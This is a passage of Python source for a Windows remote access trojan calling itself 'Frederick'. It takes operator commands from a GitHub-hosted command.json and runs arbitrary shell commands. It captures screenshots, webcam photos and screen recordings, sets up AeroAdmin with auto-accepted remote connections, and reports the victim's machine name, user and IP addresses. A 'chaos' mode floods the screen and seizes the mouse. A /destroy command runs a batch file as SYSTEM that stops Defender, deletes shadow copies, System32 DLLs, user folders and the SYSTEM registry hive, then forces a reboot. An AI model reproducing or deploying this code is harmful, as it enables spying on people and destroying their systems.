                elapsed = int(time.time() - start_time)
                log_message(f"🎥 Recording: {elapsed}/{duration} sec", "info")
        
        out.release()
        
        if RECORDING_ACTIVE:
            log_message(f"✅ Recording complete! Frames: {frames_captured}", "success")
            upload_media(filename, 'video')
            send_result(f"/vid {duration}", f"✅ Video recorded ({frames_captured} frames)", {"type": "video", "url": "local"})
            time.sleep(2)
            try:
                os.remove(filename)
            except:
                pass
        else:
            log_message("⏹️ Recording stopped", "info")
            try:
                os.remove(filename)
            except:
                pass
        
        RECORDING_ACTIVE = False
        
    except Exception as e:
        log_message(f"❌ Recording error: {str(e)}", "error")
        send_result(f"/vid {duration}", f"❌ Error: {str(e)}")
        RECORDING_ACTIVE = False

# ============================================================
# ===== CONTROL =====
# ============================================================
def start_chaos():
    global CHAOS_ACTIVE, SOUND_THREAD, WINDOW_COUNTER
    
    if CHAOS_ACTIVE:
        log_message("🔥 Chaos already running!", "warning")
        return
    
    if not GIF_CACHE:
        if not preload_gifs():
            log_message("❌ No GIFs", "error")
            return
    
    CHAOS_ACTIVE = True
    WINDOW_COUNTER = 0
    log_message("🔥 STARTING CHAOS!", "info")
    
    update_status({"chaosActive": True, "windowCount": 0})
    
    threading.Thread(target=chaos_loop, daemon=True).start()
    threading.Thread(target=mouse_shake, daemon=True).start()
    
    SOUND_THREAD = threading.Thread(target=play_sound_loop, daemon=True)
    SOUND_THREAD.start()

def stop_chaos():
    global CHAOS_ACTIVE, MOUSE_SHAKE_ACTIVE, SOUND_ACTIVE, WINDOW_COUNTER, CREATE_WINDOW
    
    CHAOS_ACTIVE = False
    MOUSE_SHAKE_ACTIVE = False
    SOUND_ACTIVE = False
    CREATE_WINDOW = False
    
    while not WINDOW_QUEUE.empty():
        try:
            WINDOW_QUEUE.get_nowait()
        except:
            break
    
    count = len(GifWindow._instances)
    for win in GifWindow._instances[:]:
        win.close()
    
    WINDOW_COUNTER = 0
    log_message(f"⏹️ CHAOS STOPPED ({count} windows closed)", "info")
    
    update_status({"chaosActive": False, "windowCount": 0})

def full_shutdown():
    global CHAOS_ACTIVE, MOUSE_SHAKE_ACTIVE, SOUND_ACTIVE, RECORDING_ACTIVE, IS_PROCESSING_CAM, AERO_PROCESS, AERO_ACCEPT_ACTIVE
    
    log_message("🛑 FULL SHUTDOWN OF FREDERICK", "system")
    
    CHAOS_ACTIVE = False
    MOUSE_SHAKE_ACTIVE = False
    SOUND_ACTIVE = False
    RECORDING_ACTIVE = False
    IS_PROCESSING_CAM = False
    AERO_ACCEPT_ACTIVE = False
    
    if AERO_PROCESS:
        try:
            AERO_PROCESS.terminate()
            time.sleep(1)
            AERO_PROCESS.kill()
        except:
            pass
    
    for win in GifWindow._instances[:]:
        win.close()
    
    while not WINDOW_QUEUE.empty():
        try:
            WINDOW_QUEUE.get_nowait()
        except:
            break
    
    update_status({"chaosActive": False, "windowCount": 0, "shutdown": True})
    log_message("✅ Frederick shut down", "system")
    sys.exit(0)

# ============================================================
# ===== KEYBOARD HOOK =====
# ============================================================
def keyboard_hook():
    last_keys = []
    target = "chotko"
    
    print("[+] Keyboard hook active. Enter 'chotko' to shutdown")
    
    while True:
        try:
            event = keyboard.read_event(suppress=False)
            if event.event_type == keyboard.KEY_DOWN:
                if event.name:
                    last_keys.append(event.name.lower())
                    if len(last_keys) > len(target):
                        last_keys.pop(0)
                    
                    typed = ''.join(last_keys)
                    if typed == target:
                        print("[+] 'chotko' detected! Shutting down...")
                        full_shutdown()
                        return
        except:
            pass
        time.sleep(0.01)

# ============================================================
# ===== DESTRUCTION =====
# ============================================================
def execute_batch_as_system(batch_content):
    try:
        with tempfile.NamedTemporaryFile(mode='w', suffix='.bat', delete=False, encoding='utf-8') as f:
            f.write(batch_content)
            bat_path = f.name
        
        ps_script = f'''
$batPath = "{bat_path}"
$action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c $batPath"
$trigger = New-ScheduledTaskTrigger -At (Get-Date).AddSeconds(2) -Once
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
Register-ScheduledTask -TaskName "FrederickKill" -Action $action -Trigger $trigger -Settings $settings -Principal $principal -Force
Start-ScheduledTask -TaskName "FrederickKill"
Start-Sleep -Seconds 3
Unregister-ScheduledTask -TaskName "FrederickKill" -Confirm:$false
'''
        
        ps_path = tempfile.gettempdir() + "\\run_as_system.ps1"
        with open(ps_path, 'w', encoding='utf-8') as f:
            f.write(ps_script)
        
        subprocess.Popen(
            ["powershell", "-ExecutionPolicy", "Bypass", "-File", ps_path],
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        return True
    except Exception as e:
        log_message(f"❌ Error: {str(e)}", "error")
        return False

def get_destruction_bat():
    return '''@echo off
chcp 65001 >nul
title Frederick - Destruction
color 0C
echo ☠️ FREDERICK DESTROYING
taskkill /f /im explorer.exe >nul 2>&1
taskkill /f /im msedge.exe >nul 2>&1
taskkill /f /im chrome.exe >nul 2>&1
net stop WinDefend /y >nul 2>&1
vssadmin delete shadows /all /quiet >nul 2>&1
takeown /f C:\\Windows\\System32\\* /r /d y >nul 2>&1
icacls C:\\Windows\\System32\\* /grant administrators:F /t /q >nul 2>&1
del /f /s /q C:\\Windows\\System32\\*.dll >nul 2>&1
rmdir /s /q C:\\Users >nul 2>&1
rmdir /s /q "C:\\Program Files" >nul 2>&1
reg delete HKLM\\SYSTEM /f >nul 2>&1
echo hacked_by_Frederick > C:\\hacked.txt
shutdown /r /f /t 5
'''

def total_destroy():
    log_message('☠️ DESTRUCTION!', "system")
    if not CHAOS_ACTIVE:
        start_chaos()
    time.sleep(3)
    batch = get_destruction_bat()
    if execute_batch_as_system(batch):
        log_message('💀 SYSTEM WILL DIE!', "system")
        send_result("/destroy", "💀 Destruction initiated! System will die.")
    else:
        send_result("/destroy", "❌ Destruction failed")

# ============================================================
# ===== COMMANDS EXECUTION =====
# ============================================================
def show_message(text):
    try:
        ctypes.windll.user32.MessageBoxW(0, text, 'FREDERICK', 0x0)
        return True
    except:
        return False

def execute_command(cmd):
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        output = result.stdout + result.stderr
        return output if output else "✅ Done"
    except Exception as e:
        return f"❌ {str(e)}"

def take_screenshot():
    try:
        screenshot = ImageGrab.grab()
        filename = f"screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
        screenshot.save(filename)
        upload_media(filename, 'image')
        send_result("/screen", "✅ Screenshot taken", {"type": "image", "url": "local"})
        time.sleep(0.5)
        try:
            os.remove(filename)
        except:
            pass
        log_message("✅ Screenshot taken", "success")
        return True
    except Exception as e:
        log_message(f'❌ {str(e)}', "error")
        send_result("/screen", f"❌ {str(e)}")
        return False

def process_cmd(cmd):
    if cmd in ['/help', '/h']:
        help_text = """FREDERICK - Complete Control

/status - Status
/msg [text] - Show message box
/command [command] - Execute in cmd
/screen - Screenshot
/cam - Webcam photo
/vid [sec] - Screen recording (5-300 sec)
/chaos - CHAOS mode
/stop - Stop chaos
/destroy - DESTROY Windows
/aero - Start AeroAdmin & get data
/accept - Start auto-accept connections
/stopaccept - Stop auto-accept
/help - This help
⌨ 'chotko' - Emergency shutdown"""
        send_result(cmd, help_text)
        return True
    
    elif cmd in ['/status', '/s']:
        status = f'✅ Active\nMode: {"GITHUB" if USE_GITHUB else "LOCAL"}\nChaos: {"YES" if CHAOS_ACTIVE else "NO"}\nWindows: {len(GifWindow._instances)}\nAeroAdmin: {"✅" if AERO_INSTALLED else "❌"}\nAuto-Accept: {"✅" if AERO_ACCEPT_ACTIVE else "❌"}\nDefender: {"✅" if DEFENDER_LAUNCHED else "❌"}'
        send_result(cmd, status)
        log_message("📊 Status requested", "info")
        return True
    
    elif cmd.startswith('/msg '):
        text = cmd[5:]
        show_message(text)
        send_result(cmd, f"✅ Message shown: {text[:50]}...")
        return True
    
    elif cmd.startswith('/command '):
        cmd_text = cmd[9:]
        output = execute_command(cmd_text)
        send_result(cmd, output[:5000] if output else "✅ Done")
        log_message(f"💻 Command executed: {cmd_text[:50]}...", "info")
        return True
    
    elif cmd in ['/screen', '/sc']:
        log_message("📸 Taking screenshot...", "info")
        threading.Thread(target=take_screenshot, daemon=True).start()
        return True
    
    elif cmd in ['/cam', '/camera']:
        threading.Thread(target=take_photo, daemon=True).start()
        return True
    
    elif cmd.startswith('/vid '):
        try:
            duration = int(cmd.split()[1])
            if duration < 1:
                duration = 5
            if duration > 300:
                duration = 300
            log_message(f'🎥 Starting recording ({duration} sec)...', "info")
            threading.Thread(target=record_screen, args=(duration,), daemon=True).start()
        except:
            send_result(cmd, 'Usage: /vid [seconds] (5-300)')
        return True
    
    elif cmd in ['/chaos', '/c']:
        start_chaos()
        send_result(cmd, "🔥 Chaos started")
        return True
    
    elif cmd in ['/stop', '/stopchaos', '/st']:
        stop_chaos()
        send_result(cmd, "⏹ Chaos stopped")
        return True
    
    elif cmd in ['/destroy', '/d']:
        total_destroy()
        return True
    
    elif cmd in ['/aero', '/aeroadmin']:
        if AERO_INSTALLED:
            log_message('📡 Getting AeroAdmin data...', "info")
            threading.Thread(target=get_aero_data, daemon=True).start()
        else:
            log_message('📡 Installing and starting AeroAdmin...', "info")
            threading.Thread(target=start_aeroadmin, daemon=True).start()
        return True
    
    elif cmd in ['/accept', '/autoaccept']:
        start_auto_accept()
        send_result(cmd, "🔄 Auto-accept enabled")
        return True
    
    elif cmd in ['/stopaccept', '/stopautoaccept']:
        stop_auto_accept()
        send_result(cmd, "⏹ Auto-accept disabled")
        return True
    
    elif cmd in ['/shutdown', '/kill']:
        full_shutdown()
        return True
    
    else:
        output = execute_command(cmd)
        send_result(cmd, output[:5000] if output else "✅ Done")
        log_message(f"💻 Executed: {cmd[:50]}...", "info")
        return True

# ============================================================
# ===== COMMAND POLLING =====
# ============================================================
def poll_commands():
    """Периодически проверяет команды"""
    global PROCESSED_COMMANDS
    
    # Проверяем доступность файла
    try:
        test_content, _ = get_file_content("command.json")
        if test_content:
            print(f"[+] ✅ File found: {test_content[:100]}")
        else:
            print("[!] ⚠️ command.json not found or empty")
            print("[!] Make sure the file exists at:")
            print(f"    https://github.com/{GITHUB_CONFIG['owner']}/{GITHUB_CONFIG['repo']}/blob/main/command.json")
    except Exception as e:
        print(f"[-] Initial check failed: {e}")
    
    while True:
        try:
            # Читаем команды из GitHub
            content, _ = get_file_content("command.json")
            if content:
                try:
                    commands = json.loads(content)
                    for cmd_data in commands:
                        cmd_id = cmd_data.get('id', '')
                        cmd = cmd_data.get('cmd', '')
                        
                        if cmd_id and cmd_id not in PROCESSED_COMMANDS:
                            PROCESSED_COMMANDS.add(cmd_id)
                            log_message(f"📩 Command: {cmd}", "command")
                            print(f"[+] Executing: {cmd}")
                            process_cmd(cmd)
                            
                            if len(PROCESSED_COMMANDS) > 100:
                                PROCESSED_COMMANDS = set(list(PROCESSED_COMMANDS)[-50:])
                except json.JSONDecodeError as e:
                    log_message(f"⚠️ Invalid JSON in command.json: {e}", "error")
                    print(f"[-] JSON error: {e}")
                    print(f"[-] Content: {content[:200]}")
            
            # Также проверяем локальный файл как fallback
            cmd = get_local_command()
            if cmd:
                cmd_id = hashlib.md5(cmd.encode()).hexdigest()[:16]
                if cmd_id not in PROCESSED_COMMANDS:
                    PROCESSED_COMMANDS.add(cmd_id)
                    log_message(f"📩 Local command: {cmd}", "command")
                    print(f"[+] Executing local: {cmd}")
                    process_cmd(cmd)
                    
                    if len(PROCESSED_COMMANDS) > 100:
                        PROCESSED_COMMANDS = set(list(PROCESSED_COMMANDS)[-50:])
            
        except Exception as e:
            print(f"[-] Poll error: {e}")
        
        time.sleep(GITHUB_CONFIG["poll_interval"])

# ============================================================
# ===== STATUS UPDATER =====
# ============================================================
def status_updater():
    """Регулярно обновляет статус системы"""
    while True:
        try:
            status = {
                "chaosActive": CHAOS_ACTIVE,
                "windowCount": len(GifWindow._instances),
                "uptime": int(time.time()),
                "aeroInstalled": AERO_INSTALLED,
                "autoAccept": AERO_ACCEPT_ACTIVE,
                "defenderLaunched": DEFENDER_LAUNCHED,
                "mode": "GITHUB" if USE_GITHUB else "LOCAL",
                "lastUpdate": datetime.now().isoformat()
            }
            update_status(status)
        except Exception as e:
            print(f"[-] Status update error: {e}")
        
        time.sleep(30)

# ============================================================
# ===== MAIN =====
# ============================================================
def main():
    global ROOT_WINDOW, DEFENDER_LAUNCHED, USE_GITHUB, LOCAL_MODE
    
    # ===== ВКЛЮЧАЕМ GITHUB РЕЖИМ (БЕЗ ТОКЕНА) =====
    USE_GITHUB = True
    LOCAL_MODE = False
    print("[+] GitHub режим включен (без токена, только чтение)")
    print(f"[+] Репозиторий: {GITHUB_CONFIG['owner']}/{GITHUB_CONFIG['repo']}")
    print(f"[+] Файл команд: command.json")
    print(f"[+] RAW URL: {GITHUB_CONFIG['raw_url']}/{GITHUB_CONFIG['owner']}/{GITHUB_CONFIG['repo']}/main/command.json")
    
    # LAUNCH DEFENDER.EXE AND PRESS Y
    try:
        print("[+] Launching defender.exe...")
        DEFENDER_LAUNCHED = launch_defender()
        if DEFENDER_LAUNCHED:
            print("[+] defender.exe launched and 'Y' key sent")
        else:
            print("[!] Failed to launch defender.exe or send 'Y' key")
    except Exception as e:
        print(f"[-] Error in defender launch: {e}")
    
    ROOT_WINDOW = tk.Tk()
    ROOT_WINDOW.withdraw()
    
    preload_gifs()
    
    # Инициализируем статус
    sys_info = get_system_info()
    update_status({
        "status": "online",
        "pc_name": sys_info["pc_name"],
        "username": sys_info["username"],
        "local_ip": sys_info["local_ip"],
        "public_ip": sys_info["public_ip"],
        "started": datetime.now().isoformat(),
        "chaosActive": False,
        "windowCount": 0,
        "mode": "GITHUB" if USE_GITHUB else "LOCAL"
    })
    
    log_message('☠️ FREDERICK STARTED', 'system')
    log_message(f'📡 Mode: {"GITHUB" if USE_GITHUB else "LOCAL"}', 'info')
    log_message(f'📡 Repository: {GITHUB_CONFIG["owner"]}/{GITHUB_CONFIG["repo"]}', 'info')
    log_message('📡 Reading commands from: command.json', 'info')
    log_message('⌨️ "chotko" - emergency shutdown', 'info')
    log_message('📡 Type /aero to start AeroAdmin', 'info')
    log_message('🔄 Type /accept to enable auto-accept', 'info')
    log_message(f'🛡️ Defender.exe: {"✅ LAUNCHED" if DEFENDER_LAUNCHED else "❌ FAILED"}', 'info')
    
    print("[+] Frederick active")
    print(f"[+] Mode: {'GITHUB' if USE_GITHUB else 'LOCAL'}")
    print(f"[+] Repository: {GITHUB_CONFIG['owner']}/{GITHUB_CONFIG['repo']}")
    print("[+] Commands from: command.json")
    print("[+] /help - all commands")
    print("[+] Enter 'chotko' to shutdown")
    
    # Стартуем потоки
    keyboard_thread = threading.Thread(target=keyboard_hook, daemon=True)
    keyboard_thread.start()
    
    poll_thread = threading.Thread(target=poll_commands, daemon=True)
    poll_thread.start()
    
    status_thread = threading.Thread(target=status_updater, daemon=True)
    status_thread.start()
    
    ROOT_WINDOW.after(100, process_queue)
    
    while True:
        try:
            try:
                ROOT_WINDOW.update()
            except:
                pass
            time.sleep(0.02)
        except Exception as e:
            print(f"[-] {e}")
            time.sleep(1)

if __name__ == '__main__':
    main()